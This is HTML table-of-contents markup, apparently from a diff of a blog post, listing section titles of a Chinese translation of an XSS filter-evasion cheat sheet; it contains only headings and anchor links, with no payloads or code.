class="nav-item nav-level-3"><a class="nav-link" href="#2-42-SVG对象标签"><span class="nav-number">2.38.</span> <span class="nav-text">2.42.    SVG对象标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-43-ECMAScript-6"><span class="nav-number">2.39.</span> <span class="nav-text">2.43.    ECMAScript 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-44-BODY标签"><span class="nav-number">2.40.</span> <span class="nav-text">2.44.    BODY标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-45-事件处理程序"><span class="nav-number">2.41.</span> <span class="nav-text">2.45.    事件处理程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-46-BGSOUND"><span class="nav-number">2.42.</span> <span class="nav-text">2.46.    BGSOUND</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-47-amp-JavaScript包含"><span class="nav-number">2.43.</span> <span class="nav-text">2.47.    & JavaScript包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-48-样式表"><span class="nav-number">2.44.</span> <span class="nav-text">2.48.    样式表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-49-远程样式表"><span class="nav-number">2.45.</span> <span class="nav-text">2.49.    远程样式表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-50-远程样式表2"><span class="nav-number">2.46.</span> <span class="nav-text">2.50.    远程样式表2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-51-远程样式表3"><span class="nav-number">2.47.</span> <span class="nav-text">2.51.    远程样式表3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-52-远程样式表4"><span class="nav-number">2.48.</span> <span class="nav-text">2.52.    远程样式表4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-53-含有分隔JavaScript的STYLE标签"><span class="nav-number">2.49.</span> <span class="nav-text">2.53.    含有分隔JavaScript的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-54-STYLE属性中使用注释分隔表达式"><span class="nav-number">2.50.</span> <span class="nav-text">2.54.    STYLE属性中使用注释分隔表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-55-含表达式的IMG-STYLE"><span class="nav-number">2.51.</span> <span class="nav-text">2.55.    含表达式的IMG STYLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-56-STYLE标签（仅旧版本Netscape可用）"><span class="nav-number">2.52.</span> <span class="nav-text">2.56.    STYLE标签（仅旧版本Netscape可用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-57-使用背景图像的STYLE标签"><span class="nav-number">2.53.</span> <span class="nav-text">2.57.    使用背景图像的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-58-使用背景的STYLE标签"><span class="nav-number">2.54.</span> <span class="nav-text">2.58.    使用背景的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-59-含STYLE属性的HTML任意标签"><span class="nav-number">2.55.</span> <span class="nav-text">2.59.    含STYLE属性的HTML任意标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-60-本地htc文件"><span class="nav-number">2.56.</span> <span class="nav-text">2.60.    本地htc文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-61-US-ASCII编码"><span class="nav-number">2.57.</span> <span class="nav-text">2.61.    US-ASCII编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-62-META"><span class="nav-number">2.58.</span> <span class="nav-text">2.62.    META</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-63-IFRAME"><span class="nav-number">2.59.</span> <span class="nav-text">2.63.    IFRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-64-基于事件IFRAME"><span class="nav-number">2.60.</span> <span class="nav-text">2.64.    基于事件IFRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-65-FRAME"><span class="nav-number">2.61.</span> <span class="nav-text">2.65.    FRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-66-TABLE"><span class="nav-number">2.62.</span> <span class="nav-text">2.66.    TABLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-67-DIV"><span class="nav-number">2.63.</span> <span class="nav-text">2.67.    DIV</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-68-html-条件选择注释块"><span class="nav-number">2.64.</span> <span class="nav-text">2.68.    html 条件选择注释块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-69-BASE标签"><span class="nav-number">2.65.</span> <span class="nav-text">2.69.    BASE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-70-OBJECT标签"><span class="nav-number">2.66.</span> <span class="nav-text">2.70.    OBJECT标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-71-使用EMBED标签加载含有XSS的FLASH文件"><span class="nav-number">2.67.</span> <span class="nav-text">2.71.    使用EMBED标签加载含有XSS的FLASH文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-72-使用EMBED-SVG包含攻击向量"><span class="nav-number">2.68.</span> <span class="nav-text">2.72.    使用EMBED SVG包含攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-73-在FLASH中使用ActionScript混淆XSS攻击向量"><span class="nav-number">2.69.</span> <span class="nav-text">2.73.    在FLASH中使用ActionScript混淆XSS攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-74-CDATA混淆的XML数据岛"><span class="nav-number">2.70.</span> <span class="nav-text">2.74.    CDATA混淆的XML数据岛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-75-使用XML数据岛生成含内嵌JavaScript的本地XML文件"><span class="nav-number">2.71.</span> <span class="nav-text">2.75.    使用XML数据岛生成含内嵌JavaScript的本地XML文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-76-XML中使用HTML-TIME"><span class="nav-number">2.72.</span> <span class="nav-text">2.76.    XML中使用HTML+TIME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-77-使用一些字符绕过”-js”过滤"><span class="nav-number">2.73.</span> <span class="nav-text">2.77.    使用一些字符绕过”.js”过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-78-SSI（服务端脚本包含）"><span class="nav-number">2.74.</span> <span class="nav-text">2.78.    SSI（服务端脚本包含）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-79-PHP"><span class="nav-number">2.75.</span> <span class="nav-text">2.79.    PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-80-嵌入命令的IMAGE"><span class="nav-number">2.76.</span> <span class="nav-text">2.80.    嵌入命令的IMAGE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-81-Cookie篡改"><span class="nav-number">2.77.</span> <span class="nav-text">2.81.    Cookie篡改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-82-UTF-7编码"><span class="nav-number">2.78.</span> <span class="nav-text">2.82.    UTF-7编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-83-利用HTML引号包含的XSS"><span class="nav-number">2.79.</span> <span class="nav-text">2.83.    利用HTML引号包含的XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-URL字符绕过"><span class="nav-number">2.80.</span> <span class="nav-text">2.84.    URL字符绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-1-IP代替域名"><span class="nav-number">2.81.</span> <span class="nav-text">2.84.1. IP代替域名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-2-URL编码"><span class="nav-number">2.82.</span> <span class="nav-text">2.84.2. URL编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-3-双字节编码"><span class="nav-number">2.83.</span> <span class="nav-text">2.84.3. 双字节编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-4-十六进制编码"><span class="nav-number">2.84.</span> <span class="nav-text">2.84.4. 十六进制编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-5-八进制编码"><span class="nav-number">2.85.</span> <span class="nav-text">2.84.5. 八进制编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-6-混合编码"><span class="nav-number">2.86.</span> <span class="nav-text">2.84.6. 混合编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-7-协议解析绕过"><span class="nav-number">2.87.</span> <span class="nav-text">2.84.7. 协议解析绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-8-Google的”feeling-lucky”功能1"><span class="nav-number">2.88.</span> <span class="nav-text">2.84.8. Google的”feeling lucky”功能1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-9-Google的”feeling-lucky”功能2"><span class="nav-number">2.89.</span> <span class="nav-text">2.84.9. Google的”feeling lucky”功能2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-10-Google的”feeling-lucky”功能3"><span class="nav-number">2.90.</span> <span class="nav-text">2.84.10.      Google的”feeling lucky”功能3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-11-移除别名"><span class="nav-number">2.91.</span> <span class="nav-text">2.84.11.      移除别名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-12-绝对DNS名称后额外的点"><span class="nav-number">2.92.</span> <span class="nav-text">2.84.12.      绝对DNS名称后额外的点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-13-JavaScriptlink-location"><span class="nav-number">2.93.</span> <span class="nav-text">2.84.13.      JavaScriptlink location</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-84-14-内容替换作为攻击向量"><span class="nav-number">2.94.</span> <span class="nav-text">2.84.14.      内容替换作为攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-85-字符转义表"><span class="nav-number">2.95.</span> <span class="nav-text">2.85.    字符转义表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-绕过WAF的方法"><span class="nav-number">3.</span> <span class="nav-text">3.绕过WAF的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过请求重定向构造XSS"><span class="nav-number">3.1.</span> <span class="nav-text">通过请求重定向构造XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Alert混淆以绕过过滤器"><span class="nav-number">3.2.</span> <span class="nav-text">3.1.  Alert混淆以绕过过滤器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-作者和主要编辑"><span class="nav-number">4.</span> <span class="nav-text">4.作者和主要编辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-贡献者"><span class="nav-number">5.</span> <span class="nav-text">5.贡献者</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#版权与许可"><span class="nav-number">5.1.</span> <span class="nav-text">版权与许可</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-介绍"><span class="nav-number">1.</span> <span class="nav-text">1.介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-测试"><span class="nav-number">2.</span> <span class="nav-text">2.测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-XSS定位器"><span class="nav-number">2.1.</span> <span class="nav-text">2.1.  XSS定位器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-XSS定位器（短）"><span class="nav-number">2.2.</span> <span class="nav-text">2.2.  XSS定位器（短）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-无过滤绕过"><span class="nav-number">2.3.</span> <span class="nav-text">2.3.  无过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-利用多语言进行过滤绕过"><span class="nav-number">2.4.</span> <span class="nav-text">2.4.  利用多语言进行过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-通过JavaScript命令实现的图片XSS"><span class="nav-number">2.5.</span> <span class="nav-text">2.5.  通过JavaScript命令实现的图片XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-无分号无引号"><span class="nav-number">2.6.</span> <span class="nav-text">2.6.  无分号无引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-不区分大小写的XSS攻击向量"><span class="nav-number">2.7.</span> <span class="nav-text">2.7.  不区分大小写的XSS攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-HTML实体"><span class="nav-number">2.8.</span> <span class="nav-text">2.8.  HTML实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-重音符混淆"><span class="nav-number">2.9.</span> <span class="nav-text">2.9.  重音符混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-畸形的A标签"><span class="nav-number">2.10.</span> <span class="nav-text">2.10.    畸形的A标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-畸形的IMG标签"><span class="nav-number">2.11.</span> <span class="nav-text">2.11.    畸形的IMG标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-12-fromCharCode函数"><span class="nav-number">2.12.</span> <span class="nav-text">2.12.    fromCharCode函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-13-使用默认SRC属性绕过SRC域名过滤器"><span class="nav-number">2.13.</span> <span class="nav-text">2.13.    使用默认SRC属性绕过SRC域名过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-14-使用默认为空的SRC属性"><span class="nav-number">2.14.</span> <span class="nav-text">2.14.    使用默认为空的SRC属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-15-使用不含SRC属性"><span class="nav-number">2.15.</span> <span class="nav-text">2.15.    使用不含SRC属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-16-通过error事件触发alert"><span class="nav-number">2.16.</span> <span class="nav-text">2.16.    通过error事件触发alert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-17-对IMG标签中onerror属性进行编码"><span class="nav-number">2.17.</span> <span class="nav-text">2.17.    对IMG标签中onerror属性进行编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-18-十进制HTML字符实体编码"><span class="nav-number">2.18.</span> <span class="nav-text">2.18.    十进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-19-不带分号的十进制HTML字符实体编码"><span class="nav-number">2.19.</span> <span class="nav-text">2.19.    不带分号的十进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-20-不带分号的十六进制HTML字符实体编码"><span class="nav-number">2.20.</span> <span class="nav-text">2.20.    不带分号的十六进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-21-内嵌TAB"><span class="nav-number">2.21.</span> <span class="nav-text">2.21.    内嵌TAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-22-内嵌编码后TAB"><span class="nav-number">2.22.</span> <span class="nav-text">2.22.    内嵌编码后TAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-23-内嵌换行分隔XSS攻击代码"><span class="nav-number">2.23.</span> <span class="nav-text">2.23.    内嵌换行分隔XSS攻击代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-24-内嵌回车分隔XSS攻击代码"><span class="nav-number">2.24.</span> <span class="nav-text">2.24.    内嵌回车分隔XSS攻击代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-25-使用空字符分隔JavaScript指令"><span class="nav-number">2.25.</span> <span class="nav-text">2.25.    使用空字符分隔JavaScript指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-26-利用IMG标签中JavaScript指令前的空格和元字符"><span class="nav-number">2.26.</span> <span class="nav-text">2.26.    利用IMG标签中JavaScript指令前的空格和元字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-27-利用非字母非数字字符"><span class="nav-number">2.27.</span> <span class="nav-text">2.27.    利用非字母非数字字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-28-额外的尖括号"><span class="nav-number">2.28.</span> <span class="nav-text">2.28.    额外的尖括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-29-未闭合的script标签"><span class="nav-number">2.29.</span> <span class="nav-text">2.29.    未闭合的script标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-30-script标签中的协议解析"><span class="nav-number">2.30.</span> <span class="nav-text">2.30.    script标签中的协议解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-31-只含左尖括号的HTML-JavaScript-XSS向量"><span class="nav-number">2.31.</span> <span class="nav-text">2.31.    只含左尖括号的HTML/JavaScript XSS向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-32-多个左尖括号"><span class="nav-number">2.32.</span> <span class="nav-text">2.32.    多个左尖括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-33-JavaScript双重转义"><span class="nav-number">2.33.</span> <span class="nav-text">2.33.    JavaScript双重转义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-34-闭合title标签"><span class="nav-number">2.34.</span> <span class="nav-text">2.34.    闭合title标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-35-INPUT-image"><span class="nav-number">2.35.</span> <span class="nav-text">2.35.    INPUT image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-36-BODY-image"><span class="nav-number">2.36.</span> <span class="nav-text">2.36.    BODY image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-37-IMG-Dynsrc"><span class="nav-number">2.37.</span> <span class="nav-text">2.37.    IMG Dynsrc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-38-IMG-lowsrc"><span class="nav-number">2.38.</span> <span class="nav-text">2.38.    IMG lowsrc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-39-List-style-image"><span class="nav-number">2.39.</span> <span class="nav-text">2.39.    List-style-image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-40-图片中引用VBscript"><span class="nav-number">2.40.</span> <span class="nav-text">2.40.    图片中引用VBscript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-41-Livescript-仅限旧版本Netscape"><span class="nav-number">2.41.</span> <span class="nav-text">2.41.    Livescript (仅限旧版本Netscape)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-42-SVG对象标签"><span class="nav-number">2.42.</span> <span class="nav-text">2.42.    SVG对象标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-43-ECMAScript-6"><span class="nav-number">2.43.</span> <span class="nav-text">2.43.    ECMAScript 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-44-BODY标签"><span class="nav-number">2.44.</span> <span class="nav-text">2.44.    BODY标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-45-事件处理程序"><span class="nav-number">2.45.</span> <span class="nav-text">2.45.    事件处理程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-46-BGSOUND"><span class="nav-number">2.46.</span> <span class="nav-text">2.46.    BGSOUND</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-47-amp-JavaScript包含"><span class="nav-number">2.47.</span> <span class="nav-text">2.47.    & JavaScript包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-48-样式表"><span class="nav-number">2.48.</span> <span class="nav-text">2.48.    样式表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-49-远程样式表"><span class="nav-number">2.49.</span> <span class="nav-text">2.49.    远程样式表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-50-远程样式表2"><span class="nav-number">2.50.</span> <span class="nav-text">2.50.    远程样式表2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-51-远程样式表3"><span class="nav-number">2.51.</span> <span class="nav-text">2.51.    远程样式表3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-52-远程样式表4"><span class="nav-number">2.52.</span> <span class="nav-text">2.52.    远程样式表4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-53-含有分隔JavaScript的STYLE标签"><span class="nav-number">2.53.</span> <span class="nav-text">2.53.    含有分隔JavaScript的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-54-STYLE属性中使用注释分隔表达式"><span class="nav-number">2.54.</span> <span class="nav-text">2.54.    STYLE属性中使用注释分隔表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-55-含表达式的IMG-STYLE"><span class="nav-number">2.55.</span> <span class="nav-text">2.55.    含表达式的IMG STYLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-56-STYLE标签（仅旧版本Netscape可用）"><span class="nav-number">2.56.</span> <span class="nav-text">2.56.    STYLE标签（仅旧版本Netscape可用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-57-使用背景图像的STYLE标签"><span class="nav-number">2.57.</span> <span class="nav-text">2.57.    使用背景图像的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-58-使用背景的STYLE标签"><span class="nav-number">2.58.</span> <span class="nav-text">2.58.    使用背景的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-59-含STYLE属性的HTML任意标签"><span class="nav-number">2.59.</span> <span class="nav-text">2.59.    含STYLE属性的HTML任意标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-60-本地htc文件"><span class="nav-number">2.60.</span> <span class="nav-text">2.60.    本地htc文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-61-US-ASCII编码"><span class="nav-number">2.61.</span> <span class="nav-text">2.61.    US-ASCII编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-62-META"><span class="nav-number">2.62.</span> <span class="nav-text">2.62.    META</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-63-IFRAME"><span class="nav-number">2.63.</span> <span class="nav-text">2.63.    IFRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-64-基于事件IFRAME"><span class="nav-number">2.64.</span> <span class="nav-text">2.64.    基于事件IFRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-65-FRAME"><span class="nav-number">2.65.</span> <span class="nav-text">2.65.    FRAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-66-TABLE"><span class="nav-number">2.66.</span> <span class="nav-text">2.66.    TABLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-67-DIV"><span class="nav-number">2.67.</span> <span class="nav-text">2.67.    DIV</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-68-html-条件选择注释块"><span class="nav-number">2.68.</span> <span class="nav-text">2.68.    html 条件选择注释块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-69-BASE标签"><span class="nav-number">2.69.</span> <span class="nav-text">2.69.    BASE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-70-OBJECT标签"><span class="nav-number">2.70.</span> <span class="nav-text">2.70.    OBJECT标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-71-使用EMBED标签加载含有XSS的FLASH文件"><span class="nav-number">2.71.</span> <span class="nav-text">2.71.    使用EMBED标签加载含有XSS的FLASH文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-72-使用EMBED-SVG包含攻击向量"><span class="nav-number">2.72.</span> <span class="nav-text">2.72.    使用EMBED SVG包含攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-73-在FLASH中使用ActionScript混淆XSS攻击向量"><span class="nav-number">2.73.</span> <span class="nav-text">2.73.    在FLASH中使用ActionScript混淆XSS攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-74-CDATA混淆的XML数据岛"><span class="nav-number">2.74.</span> <span class="nav-text">2.74.    CDATA混淆的XML数据岛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-75-使用XML数据岛生成含内嵌JavaScript的本地XML文件"><span class="nav-number">2.75.</span> <span class="nav-text">2.75.    使用XML数据岛生成含内嵌JavaScript的本地XML文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-76-XML中使用HTML-TIME"><span class="nav-number">2.76.</span> <span class="nav-text">2.76.    XML中使用HTML+TIME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-77-使用一些字符绕过”-js”过滤"><span class="nav-number">2.77.</span> <span class="nav-text">2.77.    使用一些字符绕过”.js”过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-78-SSI（服务端脚本包含）"><span class="nav-number">2.78.</span> <span class="nav-text">2.78.    SSI（服务端脚本包含）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-79-PHP"><span class="nav-number">2.79.</span> <span class="nav-text">2.79.    PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-80-嵌入命令的IMAGE"><span class="nav-number">2.80.</span> <span class="nav-text">2.80.    嵌入命令的IMAGE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-81-Cookie篡改"><span class="nav-number">2.81.</span> <span class="nav-text">2.81.    Cookie篡改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-82-UTF-7编码"><span class="nav-number">2.82.</span> <span class="nav-text">2.82.    UTF-7编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-83-利用HTML引号包含的XSS"><span class="nav-number">2.83.</span> <span class="nav-text">2.83.    利用HTML引号包含的XSS</span></a></li></ol></li></ol></div>
             
 
           </div>
